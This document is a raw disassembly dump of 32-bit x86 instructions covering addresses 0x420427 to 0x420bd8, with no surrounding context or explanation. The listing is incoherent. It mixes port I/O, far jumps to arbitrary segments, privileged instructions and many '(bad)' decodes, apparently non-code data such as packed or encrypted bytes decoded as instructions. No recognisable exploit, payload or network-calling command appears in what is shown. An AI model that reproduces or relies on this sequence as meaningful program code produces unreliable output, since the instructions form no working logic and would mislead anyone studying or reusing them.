  420427:	fisubr WORD PTR [esi+0x5660555b]
  42042d:	xor    DWORD PTR [ecx-0x6f244906],esp
  420433:	mov    BYTE PTR [eax],0xc7
  420436:	out    dx,al
  420437:	inc    ebp
  420438:	or     BYTE PTR [eax-0x43],0x27
  42043c:	adc    DWORD PTR [edx+ebx*1-0x75833bf5],ebx
  420443:	test   DWORD PTR ds:0xc0c10b27,0x20785d70
  42044d:	cmp    dh,BYTE PTR [ecx-0x52c7619e]
  420453:	in     eax,0xe3
  420455:	mov    esi,0x93831afb
  42045a:	ds out dx,eax
  42045c:	mov    BYTE PTR [eax-0x4c428f43],ch
  420462:	je     0x42047a
  420464:	jno    0x420439
  420466:	mov    ds:0x9f2552cb,eax
  42046b:	dec    ecx
  42046c:	aad    0x2b
  42046e:	rcr    BYTE PTR [ecx],0x76
  420471:	pushf  
  420472:	cmp    ebp,DWORD PTR [edx-0x7c]
  420475:	aas    
  420476:	adc    al,0x2
  420478:	push   ebp
  420479:	imul   ebp,DWORD PTR [ebp-0x32357380],0xffffffb4
  420480:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420481:	test   DWORD PTR [edx-0x2b68c9f6],edi
  420487:	xchg   ecx,eax
  420488:	sbb    DWORD PTR [esi+0x2e],ecx
  42048b:	and    al,0x92
  42048d:	outs   dx,DWORD PTR ds:[esi]
  42048e:	aas    
  42048f:	jmp    0x4204a6
  420491:	std    
  420492:	pop    eax
  420493:	push   esi
  420494:	xor    al,dl
  420496:	(bad)  
  420497:	or     DWORD PTR [eax-0x10],edx
  42049a:	mov    dl,0x2
  42049c:	in     al,0x33
  42049e:	dec    eax
  42049f:	push   es
  4204a0:	outs   dx,BYTE PTR ds:[esi]
  4204a1:	sub    BYTE PTR [ebp-0x43],dl
  4204a4:	xor    DWORD PTR [edx],0xffffffdb
  4204a7:	int3   
  4204a8:	cmp    eax,0xaadb402b
  4204ad:	xor    ah,cl
  4204af:	aad    0xa
  4204b1:	aam    0xf2
  4204b3:	mov    bl,0x46
  4204b5:	jge    0x42051c
  4204b7:	pop    esi
  4204b8:	pop    esi
  4204b9:	popa   
  4204ba:	ret    
  4204bb:	mov    ebp,0x6ab6d91e
  4204c0:	fsubr  st,st(6)
  4204c2:	dec    edi
  4204c3:	pop    eax
  4204c4:	cmc    
  4204c5:	data16 jno 0x4204ea
  4204c8:	or     bl,dh
  4204ca:	pop    ecx
  4204cb:	outs   dx,DWORD PTR ds:[esi]
  4204cc:	xchg   edx,eax
  4204cd:	gs inc eax
  4204cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4204d0:	test   al,0xd6
  4204d2:	inc    ebx
  4204d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4204d4:	mov    WORD PTR ds:0x7fa33f68,gs
  4204da:	inc    ebx
  4204db:	inc    eax
  4204dc:	sbb    DWORD PTR [edx+0x5e7c99d8],esi
  4204e2:	add    esp,DWORD PTR [edi]
  4204e4:	mov    DWORD PTR [edi],ebx
  4204e6:	nop
  4204e7:	or     WORD PTR [edi],bp
  4204ea:	aas    
  4204eb:	ds popf 
  4204ed:	push   edi
  4204ee:	xor    BYTE PTR es:[ebp-0x72fdd232],ch
  4204f5:	fistp  WORD PTR [eax+edx*8]
  4204f8:	jmp    FWORD PTR [eax-0x1a97e510]
  4204fe:	test   eax,0xe69fe0b3
  420503:	mov    ds,WORD PTR [ebx-0x127a4a5a]
  420509:	inc    ebx
  42050a:	or     BYTE PTR [edi+0x58],0x18
  42050e:	mov    ebx,0x249087f6
  420513:	fs jb  0x420508
  420516:	mov    BYTE PTR [ecx],0xb0
  420519:	mov    ds:0x9189fcb3,eax
  42051e:	dec    ecx
  42051f:	push   ebx
  420520:	cdq    
  420521:	les    edx,FWORD PTR ss:[esp+eax*2]
  420525:	pop    esp
  420526:	jmp    0x62f8:0x4fed1346
  42052d:	xor    al,0xd3
  42052f:	or     dl,0x56
  420532:	outs   dx,BYTE PTR ds:[esi]
  420533:	pop    ds
  420534:	cld    
  420535:	test   al,0x53
  420537:	shl    BYTE PTR [edx-0x27],cl
  42053a:	out    0xe3,al
  42053c:	stos   BYTE PTR es:[edi],al
  42053d:	(bad)  
  42053f:	xor    eax,0x9616e7c1
  420544:	test   DWORD PTR [edx],0xc390b7ba
  42054a:	ss push edi
  42054c:	aad    0xe8
  42054e:	sbb    DWORD PTR [edi-0x5f77bc5c],esp
  420554:	xchg   ecx,eax
  420555:	push   ss
  420556:	out    dx,al
  420557:	repz mov ds:0xb8530ecb,eax
  42055d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42055e:	adc    al,0xf0
  420560:	jge    0x42058b
  420562:	pop    ebp
  420563:	in     eax,dx
  420564:	stos   DWORD PTR es:[edi],eax
  420565:	pop    ebp
  420566:	jl     0x4204ff
  420568:	fmul   st(2),st
  42056a:	cmp    dl,BYTE PTR [eax]
  42056c:	daa    
  42056d:	pop    ebx
  42056e:	sbb    BYTE PTR [ebx-0x71],bh
  420571:	mov    eax,0x44f020a4
  420576:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420577:	iret   
  420578:	sbb    ch,dl
  42057a:	in     eax,0xc4
  42057c:	pop    esp
  42057d:	aas    
  42057e:	xor    al,0x64
  420580:	outs   dx,BYTE PTR ds:[esi]
  420581:	add    al,0x48
  420583:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420584:	xchg   edx,eax
  420585:	test   al,0xdd
  420587:	inc    ebx
  420588:	inc    ebp
  420589:	fcomp  DWORD PTR [edx]
  42058b:	xchg   cl,ah
  42058d:	aad    0xd6
  42058f:	mov    WORD PTR [ebx],ss
  420591:	call   0x4248:0x41f0013
  420598:	test   al,0x0
  42059a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42059b:	pop    ss
  42059c:	out    0x38,eax
  42059e:	sahf   
  42059f:	add    esi,DWORD PTR [esi-0x77]
  4205a2:	bound  ebp,QWORD PTR [ecx+0x702e9398]
  4205a8:	push   ebx
  4205a9:	cmp    cl,ch
  4205ab:	scas   al,BYTE PTR es:[edi]
  4205ac:	int3   
  4205ad:	mov    dh,0xc
  4205af:	je     0x420541
  4205b1:	or     cl,BYTE PTR [eax+eax*8]
  4205b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4205b5:	cmp    DWORD PTR [eax],0x22a4bd97
  4205bb:	and    eax,0x3e72e9c3
  4205c0:	push   ss
  4205c1:	pop    edx
  4205c2:	push   ebx
  4205c3:	xor    BYTE PTR [ecx],bl
  4205c5:	jns    0x42058c
  4205c7:	inc    edi
  4205c8:	es in  al,0x35
  4205cb:	push   eax
  4205cc:	jge    0x42063f
  4205ce:	sbb    bh,dl
  4205d0:	mov    edx,0x14103fd4
  4205d5:	lea    ecx,[edx]
  4205d7:	add    bl,dl
  4205d9:	test   eax,0x38d1599b
  4205de:	(bad)  
  4205df:	(bad)  
  4205e0:	jb     0x42065a
  4205e2:	pop    edx
  4205e3:	in     eax,dx
  4205e4:	push   esi
  4205e5:	es mov edi,0x3e0d9344
  4205eb:	push   0x50
  4205ed:	sbb    bh,BYTE PTR [esi]
  4205ef:	pop    edx
  4205f0:	add    ecx,DWORD PTR [ebp+0x692ad88]
  4205f6:	pushf  
  4205f7:	jp     0x4205d5
  4205f9:	adc    BYTE PTR ds:0xacf2f4b4,ah
  4205ff:	hlt    
  420600:	xchg   esi,eax
  420601:	imul   edx,ebp,0xbb2f6a7c
  420607:	mov    edx,0x398aa891
  42060c:	push   esi
  42060d:	retf   0xfd0c
  420610:	sbb    ebx,esi
  420612:	dec    edi
  420613:	jne    0x420675
  420615:	fidivr WORD PTR [edi+0x2c]
  420618:	xor    eax,0xdfaddde7
  42061d:	cmp    al,BYTE PTR [edi]
  42061f:	pop    ss
  420620:	fisttp DWORD PTR [esi]
  420622:	push   edi
  420623:	adc    al,0x62
  420625:	dec    ebp
  420626:	push   eax
  420627:	in     eax,0x71
  420629:	dec    ebx
  42062a:	push   edi
  42062b:	sbb    ecx,DWORD PTR [esi+0x743111f]
  420631:	mov    cl,BYTE PTR [edi+0x37]
  420634:	jnp    0x4205d7
  420636:	or     edi,eax
  420638:	xor    BYTE PTR [edx+0x508906b1],0xcb
  42063f:	mov    ah,0x3e
  420641:	inc    esi
  420642:	jg     0x4206c1
  420644:	push   es
  420645:	lds    eax,FWORD PTR [ebx-0x8]
  420648:	enter  0xaaa4,0x24
  42064c:	and    cl,cl
  42064e:	xchg   esp,eax
  42064f:	arpl   WORD PTR [ebx+0x5b],dx
  420652:	inc    esi
  420653:	lods   al,BYTE PTR ds:[esi]
  420654:	ret    0xd9e8
  420657:	mov    ds:0xa973c316,eax
  42065c:	les    eax,FWORD PTR [esi]
  42065e:	(bad)  
  42065f:	mov    edx,0xf178ca07
  420664:	or     al,0xfb
  420666:	ins    DWORD PTR es:[edi],dx
  420667:	inc    ebx
  420668:	xchg   DWORD PTR [edi+eiz*4],esi
  42066b:	add    esp,DWORD PTR [ecx]
  42066d:	push   edi
  42066e:	idiv   BYTE PTR [ecx-0x2a47c659]
  420674:	or     al,0x4e
  420676:	aam    0xd0
  420678:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420679:	mov    dl,0xc1
  42067b:	das    
  42067c:	mov    eax,0xa9626d12
  420681:	pop    ebp
  420682:	push   ds
  420683:	dec    esp
  420684:	push   ebp
  420685:	lods   al,BYTE PTR ds:[esi]
  420686:	aaa    
  420687:	dec    edi
  420688:	rcr    DWORD PTR [esp+edx*4+0x27],1
  42068c:	mov    cl,0x93
  42068e:	or     bh,ch
  420690:	xor    cl,cl
  420692:	jne    0x4206ae
  420694:	(bad)  
  420695:	mov    bl,0x44
  420697:	(bad)  
  420698:	mov    ch,0xa2
  42069a:	push   es
  42069b:	popa   
  42069c:	sbb    DWORD PTR [eax],0x1d4cada
  4206a2:	addr16 cdq 
  4206a4:	pop    esp
  4206a5:	aad    0x65
  4206a7:	jmp    0xb1a6:0xd0cdff29
  4206ae:	(bad)  
  4206af:	and    DWORD PTR [edx],ebp
  4206b1:	jmp    DWORD PTR [eax]
  4206b3:	dec    eax
  4206b4:	sub    BYTE PTR [edi+0x49],0x7d
  4206b8:	and    BYTE PTR [ebp+0x14],al
  4206bb:	push   esi
  4206bc:	xchg   edx,eax
  4206bd:	(bad)  
  4206be:	add    ah,BYTE PTR [edx+0x146ad89]
  4206c4:	sbb    eax,0x565cbcc3
  4206c9:	out    0xcd,eax
  4206cb:	add    eax,DWORD PTR [edi]
  4206cd:	adc    ebx,ebp
  4206cf:	rcr    DWORD PTR [edx],0xf
  4206d2:	lods   al,BYTE PTR ds:[esi]
  4206d3:	and    esi,DWORD PTR [esi-0x672a1c82]
  4206d9:	sbb    al,0x74
  4206db:	data16 jecxz 0x4206fd
  4206de:	loop   0x4206eb
  4206e0:	test   eax,0x453f27e3
  4206e5:	dec    esi
  4206e6:	xchg   dh,dh
  4206e8:	popf   
  4206e9:	jo     0x4206b8
  4206eb:	jl     0x4206b7
  4206ed:	je     0x42074c
  4206ef:	arpl   WORD PTR ds:0xf80200e,sp
  4206f5:	lods   al,BYTE PTR ds:[esi]
  4206f6:	push   esi
  4206f7:	xor    eax,0x420a93f1
  4206fc:	fs sar BYTE PTR ds:[edi+edx*4+0x52],0xab
  420703:	das    
  420704:	loope  0x420752
  420706:	das    
  420707:	stos   DWORD PTR es:[edi],eax
  420708:	mov    al,ch
  42070a:	jle    0x4206e8
  42070c:	fwait
  42070d:	test   al,0xf8
  42070f:	call   0xc1720998
  420714:	nop
  420715:	and    eax,0x5098e5b7
  42071a:	sahf   
  42071b:	sbb    BYTE PTR [ecx],bl
  42071d:	jno    0x4206c2
  42071f:	push   0xed69e998
  420724:	rcl    DWORD PTR [edi],cl
  420726:	jbe    0x4206f1
  420728:	mov    edx,0x1b3cdea
  42072d:	pushf  
  42072e:	mov    dl,0xdc
  420730:	cmp    al,0xe6
  420732:	inc    ebx
  420733:	and    DWORD PTR [ebp-0x12],eax
  420736:	test   edx,edi
  420738:	mov    dh,0xca
  42073a:	mov    ebx,0xfe01d33c
  42073f:	retf   
  420740:	out    0x2,eax
  420742:	jnp    0x4206f5
  420744:	mov    WORD PTR [eax],ds
  420746:	in     al,dx
  420747:	in     eax,dx
  420748:	cli    
  420749:	iret   
  42074a:	not    BYTE PTR [ecx+ebx*1-0x25ab45f9]
  420751:	push   eax
  420752:	(bad)  
  420753:	mov    dh,0xb2
  420755:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420756:	fcomp  QWORD PTR [eax-0x40253918]
  42075c:	(bad)  
  42075e:	imul   edx,DWORD PTR [eiz*8+0x2f85187d],0x6959020e
  420769:	xor    ecx,DWORD PTR [edx+0x362fcb54]
  42076f:	xor    cl,dh
  420771:	mov    ebp,0x9110ab65
  420776:	push   cs
  420777:	sub    al,0xcd
  420779:	call   0x1092:0x66c268b5
  420780:	xor    BYTE PTR [edi-0x31],cl
  420783:	fcomp  QWORD PTR [edx+eax*1+0x5c263717]
  42078a:	cs scas al,BYTE PTR es:[edi]
  42078c:	push   0x84b869aa
  420791:	xchg   edx,eax
  420792:	inc    edx
  420793:	scas   eax,DWORD PTR es:[edi]
  420794:	ja     0x4207b0
  420796:	bound  edi,QWORD PTR [ecx+0x62]
  420799:	mov    ch,0xd0
  42079b:	push   ebx
  42079c:	inc    esi
  42079d:	inc    ebx
  42079e:	mov    al,ds:0x168355b3
  4207a3:	int    0x13
  4207a5:	and    cl,BYTE PTR [edi+0x57e8ee97]
  4207ab:	sbb    esi,0x51636bd0
  4207b1:	cli    
  4207b2:	push   ebx
  4207b3:	jmp    0x64c8b0c4
  4207b8:	ror    bl,0x89
  4207bb:	mov    edx,0xe1f7ce75
  4207c0:	and    BYTE PTR [esi*1+0x45bc9b0f],bl
  4207c7:	inc    edx
  4207c8:	xchg   ebx,eax
  4207c9:	push   edi
  4207ca:	dec    edi
  4207cb:	push   cs
  4207cc:	or     DWORD PTR [edi-0x24ccff95],edx
  4207d2:	lods   eax,DWORD PTR ds:[esi]
  4207d3:	mov    dh,0x3e
  4207d5:	mov    DWORD PTR ds:0xce92502b,edx
  4207db:	jmp    0x394d266e
  4207e0:	lahf   
  4207e1:	loop   0x4207eb
  4207e3:	(bad)  
  4207e4:	or     eax,0xc92808d6
  4207e9:	dec    eax
  4207ea:	cmp    eax,0xdae848be
  4207ef:	imul   edi,DWORD PTR [edx+0x6b],0xfffffffa
  4207f3:	push   edi
  4207f4:	pop    es
  4207f5:	test   DWORD PTR [edx+ecx*1-0x3696bf50],ecx
  4207fc:	or     BYTE PTR [eax-0x33985a80],0x24
  420803:	sub    al,0x92
  420805:	xor    al,0x86
  420807:	pop    ebx
  420808:	and    esp,DWORD PTR [ecx-0x1b]
  42080b:	cmp    edi,0x60
  42080e:	aam    0xa0
  420810:	add    BYTE PTR [esp+esi*2+0x5b],ah
  420814:	inc    edx
  420815:	pop    ebx
  420816:	dec    esi
  420817:	jno    0x4207d5
  420819:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42081a:	pop    ecx
  42081b:	jg     0x420865
  42081d:	repz loope 0x420833
  420820:	fmulp  st(1),st
  420822:	and    DWORD PTR ds:0x5bf14d96,ebx
  420828:	xor    BYTE PTR [eax-0x206703d7],bh
  42082e:	aam    0x8d
  420830:	pop    ebp
  420831:	aaa    
  420832:	mov    DWORD PTR [ebp-0x3],esi
  420835:	mov    eax,0x98b4a81f
  42083a:	jnp    0x420837
  42083c:	mov    eax,0xe94089e4
  420841:	push   ecx
  420843:	xor    ah,BYTE PTR ds:0x73e5de99
  420849:	sub    eax,0xcac11fb4
  42084e:	std    
  42084f:	pop    es
  420850:	enter  0xb554,0x7c
  420854:	pop    esp
  420855:	push   ecx
  420856:	jge    0x420839
  420858:	sbb    edi,DWORD PTR [eax]
  42085a:	std    
  42085b:	lods   eax,DWORD PTR ds:[esi]
  42085c:	mov    bl,0x9b
  42085e:	stc    
  42085f:	pop    edx
  420860:	xchg   BYTE PTR [ebx],ah
  420862:	and    DWORD PTR [ebx-0x16499cbb],esp
  420868:	sbb    eax,DWORD PTR [edi]
  42086a:	push   ebp
  42086b:	dec    esp
  42086c:	rol    BYTE PTR [esi-0x80],0x30
  420870:	in     al,0x77
  420872:	pop    ds
  420873:	repnz daa 
  420875:	add    BYTE PTR ds:0x854f1d42,dh
  42087b:	outs   dx,BYTE PTR ds:[esi]
  42087c:	mov    eax,ds:0xf1f21ca3
  420881:	jecxz  0x420821
  420883:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420884:	jl     0x4208c9
  420886:	int3   
  420887:	mov    al,ds:0xa8577dd4
  42088c:	adc    al,BYTE PTR [ebx-0x2c10a8e5]
  420892:	add    ebx,DWORD PTR [edi]
  420894:	cli    
  420895:	mov    ecx,0xc3cfe889
  42089a:	aaa    
  42089b:	not    DWORD PTR [bp+di]
  42089e:	xchg   ebp,eax
  42089f:	mov    ?,WORD PTR [edx]
  4208a1:	and    al,0xd6
  4208a3:	ins    DWORD PTR es:[edi],dx
  4208a4:	and    BYTE PTR [ecx+0x74],dh
  4208a7:	mov    ds:0x32ca9db7,eax
  4208ac:	jp     0x420885
  4208ae:	or     al,0xe8
  4208b0:	xchg   esi,eax
  4208b1:	sbb    DWORD PTR ds:0xc2e,edx
  4208b7:	(bad)  
  4208b8:	ss sub eax,0xbc1e09a0
  4208be:	dec    ebx
  4208bf:	mov    ch,0x4e
  4208c1:	dec    ebp
  4208c2:	jg     0x4208e4
  4208c4:	mul    BYTE PTR [ebx-0x1b73dbb7]
  4208ca:	or     BYTE PTR [eax+0x60],bh
  4208cd:	lea    ebx,[ecx+0x5b]
  4208d0:	sbb    ah,BYTE PTR [eax]
  4208d2:	hlt    
  4208d3:	jbe    0x420931
  4208d5:	add    dl,al
  4208d7:	lds    edx,FWORD PTR [ecx-0x6e]
  4208da:	cmp    edi,DWORD PTR [edi]
  4208dc:	push   edx
  4208dd:	call   0x337e:0x6ac88adc
  4208e4:	retf   0xb83c
  4208e7:	mov    ebx,0x749df7c3
  4208ec:	test   al,0x87
  4208ee:	or     BYTE PTR [ebp+0x1ec3c41c],cl
  4208f4:	out    0x19,al
  4208f6:	imul   ebp,DWORD PTR [edi+edi*8],0x25
  4208fa:	inc    ebp
  4208fb:	mul    bh
  4208fd:	div    DWORD PTR [esi+0x823b131]
  420903:	pop    ebp
  420904:	mov    bl,0x65
  420906:	mov    bl,0xee
  420908:	loope  0x4208bf
  42090a:	mov    fs,WORD PTR [ebp+0x9e017d9]
  420910:	adc    ecx,DWORD PTR ds:0x70c1f5a0
  420916:	push   ds
  420917:	sti    
  420918:	mov    esi,edi
  42091a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42091b:	sub    eax,esp
  42091d:	fsubr  DWORD PTR [ebx+0x3e]
  420920:	ds std 
  420922:	cdq    
  420923:	push   0x79d296f7
  420928:	icebp  
  420929:	retf   
  42092a:	sahf   
  42092b:	and    DWORD PTR [ecx],eax
  42092d:	pop    ss
  42092e:	call   0x7d64393d
  420933:	(bad)  
  420934:	lods   al,BYTE PTR ds:[esi]
  420935:	jle    0x420979
  420937:	push   esp
  420938:	scas   al,BYTE PTR es:[edi]
  420939:	in     al,0xe
  42093b:	fwait
  42093c:	and    al,0x0
  42093e:	retf   
  42093f:	scas   al,BYTE PTR es:[edi]
  420940:	mov    ds:0xb0516d92,eax
  420945:	rcl    DWORD PTR [eax-0x3f],1
  420948:	in     al,0x5f
  42094a:	lea    esi,[esp+ebx*8+0x76dd16d7]
  420951:	and    BYTE PTR [edi],bh
  420953:	shr    esp,1
  420955:	out    0x20,eax
  420957:	pop    ss
  420958:	xchg   ebp,eax
  420959:	sti    
  42095a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42095b:	and    DWORD PTR [esi],esi
  42095d:	iret   
  42095e:	dec    ebp
  42095f:	enter  0xc907,0xd0
  420963:	arpl   WORD PTR [ebp+0x6d],bx
  420966:	int3   
  420967:	jbe    0x42099b
  420969:	adc    ecx,DWORD PTR [esi]
  42096b:	in     al,dx
  42096c:	mov    WORD PTR [edi-0x2c],fs
  42096f:	xor    esi,DWORD PTR [eax+0x68b3e381]
  420975:	fs pusha 
  420977:	inc    eax
  420978:	and    BYTE PTR [ebx],ch
  42097a:	mov    bh,BYTE PTR [edi]
  42097c:	xlat   BYTE PTR ds:[ebx]
  42097d:	mov    cr4,ebx
  420980:	xor    dh,ah
  420982:	or     eax,0x454494e4
  420987:	sub    BYTE PTR ds:0xee8f9c13,cl
  42098d:	xor    ah,BYTE PTR [esi]
  42098f:	cmp    BYTE PTR [esi+edx*1],dl
  420992:	sbb    eax,0xf1dbfcd1
  420997:	xchg   esi,eax
  420998:	leave  
  420999:	xchg   edx,eax
  42099a:	test   eax,0x411a1f3d
  42099f:	js     0x420a1e
  4209a1:	mov    bl,0x8b
  4209a3:	imul   ebp,DWORD PTR [ebp+0x350d6f01],0x1c
  4209aa:	cmp    ecx,eax
  4209ac:	int3   
  4209ad:	xchg   ebp,eax
  4209ae:	sub    eax,0x31377ea5
  4209b3:	test   edi,ebp
  4209b5:	clc    
  4209b6:	pop    es
  4209b7:	mov    WORD PTR [eax-0x27],es
  4209ba:	aam    0xe5
  4209bc:	pop    esp
  4209bd:	cmp    dl,BYTE PTR [esi+0x4a6a7588]
  4209c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4209c4:	push   ecx
  4209c5:	mov    eax,0x35ee4563
  4209ca:	in     eax,0xe
  4209cc:	icebp  
  4209cd:	sbb    eax,0x4ad8f0b0
  4209d2:	adc    eax,0x3b9df11d
  4209d7:	fnstsw WORD PTR [edx-0x5857ceb7]
  4209dd:	cmp    al,0xe2
  4209df:	and    bl,dl
  4209e1:	push   ds
  4209e2:	or     ch,BYTE PTR [edi-0x5d1770a8]
  4209e8:	dec    esp
  4209e9:	jo     0x42097f
  4209eb:	inc    ebp
  4209ec:	cdq    
  4209ed:	and    BYTE PTR [edi+eiz*1+0x5a],ah
  4209f1:	cmc    
  4209f2:	adc    BYTE PTR [ebx+eiz*8+0x2e19dd0f],0x87
  4209fa:	dec    esp
  4209fb:	(bad)  
  4209fc:	add    DWORD PTR [ecx+0x43],esi
  4209ff:	add    al,0x16
  420a01:	sub    DWORD PTR [eax-0x44779136],0x2e383596
  420a0b:	xchg   ecx,eax
  420a0c:	jnp    0x4209ef
  420a0e:	loop   0x420a04
  420a10:	sar    BYTE PTR [edi],0x14
  420a13:	out    0x86,al
  420a15:	xchg   esi,eax
  420a16:	or     eax,0xa0a2d03f
  420a1b:	call   0x2eb9df75
  420a20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a21:	out    0x9f,eax
  420a23:	sbb    al,0x7f
  420a25:	sub    cl,bl
  420a27:	or     eax,ebx
  420a29:	push   edi
  420a2a:	xchg   ebp,eax
  420a2b:	rcl    eax,1
  420a2d:	and    eax,0xfc466784
  420a32:	test   eax,0xf0a07562
  420a37:	jmp    0x420a25
  420a39:	jl     0x4209fc
  420a3b:	xchg   BYTE PTR [ecx+0x6a],al
  420a3e:	jae    0x420a3a
  420a40:	(bad)  
  420a41:	test   eax,0x1eb19310
  420a46:	and    esi,DWORD PTR [esi+0x7d]
  420a49:	sar    BYTE PTR [ecx],0xca
  420a4c:	cli    
  420a4d:	or     edi,edi
  420a4f:	sbb    ch,al
  420a51:	in     eax,0x30
  420a53:	jecxz  0x420a03
  420a55:	push   ebx
  420a56:	test   eax,0x9d3b05bc
  420a5b:	mul    dh
  420a5d:	les    ebp,FWORD PTR [edi-0x34057335]
  420a63:	mov    eax,ds:0x2b10654f
  420a68:	ret    0x9fb
  420a6b:	ror    DWORD PTR [ecx],1
  420a6d:	adc    bh,cl
  420a6f:	(bad)  
  420a71:	mov    ?,esp
  420a73:	cmp    BYTE PTR [ebx+0x20773250],cl
  420a79:	(bad)  
  420a7a:	mov    eax,ds:0xca565796
  420a7f:	dec    eax
  420a80:	adc    esi,DWORD PTR [ebp-0x19f14702]
  420a86:	cs mov dh,0xdc
  420a89:	mov    ebx,0x9977bcb5
  420a8e:	xchg   esp,eax
  420a8f:	lea    ecx,[edi-0x16]
  420a92:	push   esi
  420a93:	push   edx
  420a94:	xor    al,0xbd
  420a96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a97:	mov    edx,0xbbc6751d
  420a9c:	push   0x2b09edd0
  420aa1:	outs   dx,DWORD PTR ds:[esi]
  420aa2:	mov    BYTE PTR [ebp-0x3a],ah
  420aa5:	mov    al,0x37
  420aa7:	stos   DWORD PTR es:[edi],eax
  420aa8:	ins    DWORD PTR es:[edi],dx
  420aa9:	test   BYTE PTR [edi],bh
  420aab:	es loop 0x420a44
  420aae:	add    bh,BYTE PTR [esi+0x54a26cbe]
  420ab4:	out    dx,al
  420ab5:	inc    edi
  420ab6:	sub    DWORD PTR [edx+0x56],ebp
  420ab9:	push   esi
  420aba:	mov    ebp,DWORD PTR [eax-0xd]
  420abd:	outs   dx,BYTE PTR ds:[esi]
  420abe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420abf:	bound  eax,QWORD PTR [ecx]
  420ac1:	cmp    al,0x9b
  420ac3:	loop   0x420b26
  420ac5:	fstp   DWORD PTR [edi+ebp*8]
  420ac8:	dec    ebp
  420ac9:	and    DWORD PTR [ebx],edx
  420acb:	fbld   TBYTE PTR ds:0x6c27de2d
  420ad1:	sahf   
  420ad2:	inc    ebx
  420ad3:	push   cs
  420ad4:	stos   DWORD PTR es:[edi],eax
  420ad5:	add    DWORD PTR [ebx],ebp
  420ad7:	mov    ebx,DWORD PTR [ebp+0x6b]
  420ada:	sti    
  420adb:	rol    BYTE PTR [eax+0x15f1e91b],cl
  420ae1:	add    bl,BYTE PTR [edx+eiz*1-0x32d00174]
  420ae8:	fs ja  0x420afe
  420aeb:	in     eax,0x46
  420aed:	inc    ebx
  420aee:	lock and ah,BYTE PTR [ecx]
  420af1:	in     al,0x92
  420af3:	cmp    DWORD PTR [esp+ebp*2],esi
  420af6:	inc    esi
  420af7:	cmp    DWORD PTR [esi+0x6c5256cf],0xffffffe6
  420afe:	lahf   
  420aff:	daa    
  420b00:	scas   al,BYTE PTR es:[edi]
  420b01:	test   al,0x96
  420b03:	jl     0x420b4b
  420b05:	xor    edi,ebp
  420b07:	sbb    eax,0x755766c3
  420b0c:	cmp    al,0x70
  420b0e:	popf   
  420b0f:	(bad)  
  420b10:	mov    BYTE PTR ds:0x3f7202a5,bh
  420b16:	ss pop ss
  420b18:	ror    DWORD PTR [eax+0x1554f0f8],0xda
  420b1f:	das    
  420b20:	idiv   esi
  420b22:	pop    es
  420b23:	ins    DWORD PTR es:[edi],dx
  420b24:	pop    ebp
  420b25:	daa    
  420b26:	mov    dh,0x40
  420b28:	neg    DWORD PTR [ebp-0x5a]
  420b2b:	push   es
  420b2c:	xlat   BYTE PTR ds:[ebx]
  420b2d:	and    al,0xb3
  420b2f:	xchg   edi,eax
  420b30:	fld    TBYTE PTR [edi-0x3c505c84]
  420b36:	out    dx,al
  420b37:	adc    al,0xa2
  420b39:	mov    edi,DWORD PTR [ecx-0x11b9e2be]
  420b3f:	mov    ch,0x72
  420b41:	retf   0xd283
  420b44:	xchg   ebp,eax
  420b45:	lea    esi,[edx+esi*4-0x50027d5e]
  420b4c:	pop    edi
  420b4d:	jmp    0x8515:0xa6491077
  420b54:	stos   DWORD PTR es:[edi],eax
  420b55:	add    edx,DWORD PTR [ecx]
  420b57:	push   ecx
  420b58:	inc    eax
  420b59:	out    0x7d,eax
  420b5b:	jp     0x420b7b
  420b5d:	or     eax,0x480b48c4
  420b62:	adc    edx,eax
  420b64:	scas   eax,DWORD PTR es:[edi]
  420b65:	maskmovq mm4,(bad)
  420b66:	mul    DWORD PTR [ebp-0x674ca1ce]
  420b6c:	data16 loope 0x420b8f
  420b6f:	test   DWORD PTR [edx-0x3d4b92b6],0xfe112a2e
  420b79:	pushf  
  420b7a:	sbb    cl,BYTE PTR [eax-0x63]
  420b7d:	sbb    al,0x3f
  420b7f:	repz cmp al,0xfe
  420b82:	into   
  420b83:	cs jns 0x420b15
  420b86:	pop    edx
  420b87:	std    
  420b88:	imul   ecx,DWORD PTR [esi-0x1f2d95e8],0x2ecfe925
  420b92:	adc    BYTE PTR [ebx],0xa0
  420b95:	in     eax,0xe6
  420b97:	adc    bh,bh
  420b99:	jg     0x420b28
  420b9b:	dec    ebx
  420b9c:	(bad)  
  420b9d:	out    dx,al
  420b9e:	das    
  420b9f:	pop    ds
  420ba0:	inc    esp
  420ba1:	ins    BYTE PTR es:[edi],dx
  420ba2:	pop    ecx
  420ba3:	xchg   ebp,eax
  420ba4:	imul   ecx,DWORD PTR [ebx+0x45069f15],0xaf0d0882
  420bae:	push   ds
  420baf:	lods   eax,DWORD PTR ds:[esi]
  420bb0:	xchg   edx,eax
  420bb1:	dec    esp
  420bb2:	inc    ecx
  420bb3:	pop    ecx
  420bb4:	push   0x2ee8c632
  420bb9:	xor    eax,0x4709a37e
  420bbe:	add    al,0xb7
  420bc0:	scas   eax,DWORD PTR es:[edi]
  420bc1:	mov    edx,ebx
  420bc3:	xadd   DWORD PTR [ecx],esi
  420bc6:	aas    
  420bc7:	inc    ebx
  420bc8:	in     eax,0x1e
  420bca:	mov    DWORD PTR ds:0x25fe9633,esp
  420bd0:	inc    edi
  420bd1:	cmp    eax,edx
  420bd3:	jo     0x420be2
  420bd5:	std    
  420bd6:	shl    edx,cl
  420bd8:	or     DWORD PTR [eax+0x2a1993fb],ebx
